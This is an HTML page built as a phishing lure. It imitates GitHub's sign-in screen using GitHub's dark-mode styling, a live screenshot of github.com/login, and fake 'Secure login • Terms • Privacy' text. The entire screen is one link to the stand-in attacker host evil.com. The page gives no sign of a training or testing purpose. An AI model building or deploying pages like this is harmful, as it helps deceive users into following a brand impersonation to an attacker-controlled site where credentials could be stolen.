<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to GitHub</title>
    <style>
        /* This CSS makes it a TRUE full-screen page */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background-color: #0d1117; /* GitHub Dark Mode color */
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
            color: #c9d1d9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden; /* Stops scrolling */
        }

        /* Make the link cover the ENTIRE screen */
        .full-screen-link {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100vw;
            height: 100vh;
            text-decoration: none;
            color: inherit;
            padding: 20px;
            box-sizing: border-box;
        }

        h2 { margin-bottom: 5px; font-size: 24px; font-weight: normal; }
        p.subtitle { color: #8b949e; font-size: 14px; margin-top: 0; margin-bottom: 30px; }
        
        /* The Image */
        img { 
            width: 100%; 
            max-width: 400px; 
            border-radius: 8px;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }

        p.footer { color: #8b949e; font-size: 12px; margin-top: 30px; }
    </style>
</head>
<body>

    <!-- Everything inside this link is clickable -->
    <a href="https://evil.com" class="full-screen-link">
        <h2>Sign in to GitHub</h2>
        <p class="subtitle">to continue to your account</p>
        
        <!-- The Image -->
        <img src="https://image.thum.io/get/width/1300/https://github.com/login" alt="GitHub Login">
        
        <p class="footer">Secure login • Terms • Privacy</p>
    </a>

</body>
</html>
